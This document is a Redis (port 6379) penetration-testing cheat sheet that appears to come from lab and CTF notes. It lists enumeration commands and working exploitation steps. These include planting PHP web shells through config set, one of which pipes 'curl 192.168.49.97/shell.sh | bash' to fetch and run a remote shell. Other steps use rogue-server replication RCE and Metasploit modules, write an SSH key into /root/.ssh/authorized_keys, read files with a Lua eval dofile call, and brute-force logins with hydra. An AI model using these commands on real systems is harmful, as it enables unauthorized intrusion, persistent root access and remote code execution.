# 6379 (Redis)

## Enumeration

### Automatic

#### nmap

```bash
nmap --script redis-info -sV -p 6379 <IP>
```

#### Metasploit

```bash
msf> use auxiliary/scanner/redis/redis_server
```

### Manual

#### Telnet, Netcat, Redis-cli

```bash
telnet <IP> 6379
nc -vn <IP> 6379
redis-cli -h <IP>
```

Commands:

```bash
# Check version info etc. as well as the ability to run commands without auth
INFO
# List all the stored keys.
KEYS *
# Get the value of a stored key
GET <KEY>
# Other
config get *
config get dir
```

#### Curl Gopher

```
curl gopher://demo1.ine.local:6379/_GET%20flag --max-time 1
```

#### LFI

If LFI is found, you can enumerate the local file system for interesting files

```bash
# Look at the redis configuration file (check for passwords)
/etc/redis/redis.conf
# Look for the web DocumentRoot in the conf file
/etc/apache2/sites-enabled/000-default.conf  # Ex: apache2
# Look at the redis service file (check for ReadWriteDirectories)
/etc/systemd/system/redis.service
```

Attempt to write a file to a directory that is found in the web root or is listed as ReadWriteDirectories

## Exploitation

### PHP Web Shell

```bash
redis-cli -h <IP> -a <PASSWORD>
192.168.97.166:6379> config set dir /opt/redis-files
OK
192.168.97.166:6379> config set dbfilename rce.php
OK
192.168.97.166:6379> set test "<?php phpinfo(); ?>"  # or
192.168.97.166:6379> set test "<?php system('id'); ?>"  # or
192.168.97.166:6379> set test "<?php system('curl 192.168.49.97/shell.sh | bash'); ?>"
OK
192.168.97.166:6379> save
OK
```

### Rogue Server

[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)

```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server
cd redis-rogue-server/
./redis-rogue-server.py --rhost 192.168.76.69 --lhost 127.0.0.1
# or
python3 redis-rogue-server.py --rhost 192.168.76.69 --rport 6379 --lhost 192.168.49.76 --lport 6379

```

### Unauthenticated Redis Server

#### Metasploit

```bash
msfconsole
search redis
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS <IP>
set LHOST <IP>
set SRVHOST <IP>
exploit
```

### Overwriting Arbitrary Files

#### Redis-cli

```bash
# Generate Key Pair
ssh-keygen
ssh-key
<enter>
<enter>
# Copy key file and place onto Redis server naming it test
# Ex: 1
(echo -e "\n\n"; cat /root/ssh-key.pub; echo -e "\n\n") > key
cat key | redis-cli -h demo2.ine.local -x set test
# Ex: 2
(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h <IP> -x set ssh_key
cat spaced_key.txt | redis-cli -h 192.168.97.166 -a <password> -x set ssh_key
# Dump the key to the target machine /root/.ssh/ directory using redis-cli
redis-cli -h demo2.ine.local
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"
save
# We have successfully uploaded the public key as authorized_keys.
# Access the target machine
ssh -i ssh-key root@demo2.ine.local
```

#### Metasploit

```bash
use auxiliary/scanner/redis/file_upload
set RHOSTS demo2.ine.local
set LocalFile /root/key
set RemoteFile /root/.ssh/authorized_keys
exploit
```

### Attacking Protected Redis

#### Metasploit

```bash
use auxiliary/scanner/redis/redis_login
set RHOSTS demo3.ine.local
exploit
# We found a credential
redis-cli -h demo3.ine.local
AUTH daniel
KEYS *
GET <KEY>
```

### Eval Abuse

> CTF Ex: Doing some research it is found that abuse of the eval and dotfile can be used

```bash
# Get the contents of the user.txt file
redis-cli -h <IP> -p 6379 eval "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0

```

## Brute Force

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra â€“P /path/pass.txt redis://<IP>:<PORT>  # 6379 is the default
```

